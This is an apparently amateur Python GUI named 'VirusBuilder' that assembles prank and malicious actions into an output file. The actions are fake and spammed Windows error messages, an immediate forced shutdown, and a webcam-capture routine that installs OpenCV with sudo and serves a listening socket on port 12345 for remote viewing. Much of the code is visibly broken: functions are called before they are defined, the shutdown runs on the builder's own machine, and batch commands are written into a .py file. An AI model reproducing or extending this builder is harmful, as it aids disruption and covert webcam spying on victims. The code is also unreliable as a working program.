import tkinter as tk
import os
import socket
from tkinter import messagebox

class bcolors:
    GREEN = 'green'
    YELLOW = 'yellow'
    RED = 'red'
    RESET = 'black'

def get_multitool_path():
    if os.name == 'nt':  # Windows
        return os.path.join(os.path.expanduser('~'), 'multitool')
    elif os.name == 'posix':  # Unix/Linux/Mac
        return os.path.join(os.path.expanduser('~'), 'multitool')
    else:
        raise Exception('Unsupported OS')

def create_file(contents):
    multitool_path = get_multitool_path()
    if not os.path.exists(multitool_path):
        os.makedirs(multitool_path)
    file_path = os.path.join(multitool_path, 'combined_actions.py')
    
    with open(file_path, 'w') as file:
        for content in contents:
            file.write(content + "\n")
    
    print(f"File created at {file_path}")

def add_shutdown_action():
    os.system('shutdown -s -t 1')
    messagebox.showinfo("Info", "Shutdown action added")

def add_fake_error_action():
    contents.append('msg * "This is a fake error message"')
    messagebox.showinfo("Info", "Fake error action added")

def add_spam_error_action():
    contents.append('for /L %%i in (1, 1, 10) do msg * "This is a spam error message"')
    messagebox.showinfo("Info", "Spam error action added")

def add_capture_cam():
    try:
        os.system('sudo apt install python3-pip')
        os.system('sudo pip install opencv-python --break-system-packages')
        os.system('sudo pip install OpenCV --break-system-packages')
        import cv2
    except Exception as e:
        print(bcolors.RED + f'Error: {e}' + bcolors.RESET)
    contents.append("CaptureCam action added")

    class Cam_message:
        def __init__(self):
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.bind(('0.0.0.0', 12345))
            server_socket.listen(1)

            conn, addr = server_socket.accept()
            while True:
                reply = capture_cam()
                conn.send(reply.encode())
    Cam_message()
    
    def capture_cam():
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            print('Error: Could not open the webcam')
            exit()
        while True:
            ret, frame = cap.read()
            if not ret:
                print('Error: Could not read frame')
                break
            cv2.imshow('Webcam', frame)

            if cv2.waitKey(1) & 0xFF == ord('q'):
                break
        cap.release()
        cv2.destroyAllWindows()

def save_and_exit():
    create_file(contents)
    root.destroy()

root = tk.Tk()
root.title("VirusBuilder")
root.configure(bg='black')

screen_width = 500
screen_height = 500
root.geometry(f'{screen_width}x{screen_height}')

contents = []

# Überschrift mit grünem Rand und schwarzem Hintergrund
L1 = tk.Label(root, text='VirusBuilder', fg=bcolors.GREEN, bg='black', bd=2, relief='solid', font=("Helvetica", 16, "bold"))
L1.pack(pady=10)

# Buttons mit grünem Rand und schwarzem Hintergrund
B1 = tk.Button(root, text='Add Fake Error', fg=bcolors.GREEN, bg='black', bd=2, relief='solid', highlightbackground=bcolors.GREEN, command=add_fake_error_action)
B1.pack(pady=10)

B2 = tk.Button(root, text='Add Shutdown', fg=bcolors.GREEN, bg='black', bd=2, relief='solid', highlightbackground=bcolors.GREEN, command=add_shutdown_action)
B2.pack(pady=10)

B3 = tk.Button(root, text='Add Spam Error', fg=bcolors.GREEN, bg='black', bd=2, relief='solid', highlightbackground=bcolors.GREEN, command=add_spam_error_action)
B3.pack(pady=10)

B4 = tk.Button(root, text='Add CaptureCam', fg=bcolors.GREEN, bg='black', bd=2, relief='solid', highlightbackground=bcolors.GREEN, command=add_capture_cam)
B4.pack(pady=10)

B5 = tk.Button(root, text='Save & Exit', fg=bcolors.GREEN, bg='black', bd=2, relief='solid', highlightbackground=bcolors.GREEN, command=save_and_exit)
B5.pack(pady=10)

root.mainloop()
